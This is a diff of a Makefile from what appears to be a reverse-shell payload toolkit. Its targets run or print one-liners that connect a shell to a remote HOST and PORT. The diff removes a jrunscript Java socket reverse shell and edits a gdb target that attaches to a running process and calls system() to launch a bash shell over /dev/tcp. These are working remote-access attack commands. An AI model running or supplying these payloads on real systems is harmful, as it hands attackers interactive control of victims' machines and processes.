@@ -313,16 +313,6 @@ node-show:
 
 ############################################################
 
-######################## JRUNSCRIPT ########################
-
-jrunscript:
-	jrunscript -e 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(RSHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();'
-
-jrunscript-show:
-	@printf "jrunscript -e 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(RSHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();'\n"
-
-############################################################
-
 ############################ JJS ###########################
 
 jjs:
@@ -392,14 +382,14 @@ gdb:
 		printf "$(RED)Error:$(RESET) PID is not set. Set it to the PID of the process with access to system() call.\n"; \
 		exit 1; \
 	fi
-	gdb --batch -p $(PID) -ex 'call system("bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''")'
+	gdb --batch -p $(PID) -ex 'call (int) system("bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''")'
 
 gdb-show:
 	@if [ -z "$(PID)" ]; then \
 		printf "$(RED)Error:$(RESET) PID is not set. Set it to the PID of the process with access to system() call.\n"; \
 		exit 1; \
 	fi
-	@printf "gdb --batch -p $(PID) -ex 'call system(\"bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''\")'\n"
+	@printf "gdb --batch -p $(PID) -ex 'call (int) system(\"bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''\")'\n"
 
 ############################################################
 
